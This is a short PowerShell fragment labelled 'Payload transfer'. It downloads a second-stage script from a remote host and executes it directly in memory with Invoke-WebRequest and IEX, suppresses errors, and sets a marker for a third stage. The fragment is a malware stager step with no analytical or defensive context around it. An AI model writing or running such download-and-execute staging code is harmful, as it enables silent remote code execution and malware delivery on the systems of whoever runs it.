
# Payload transfer
$Stage2Url = 'http://internal.corp/stage2.ps1'
IEX (Invoke-WebRequest -Uri $Stage2Url -UseBasicParsing -ErrorAction SilentlyContinue).Content
$StageMarker = "stage-3"
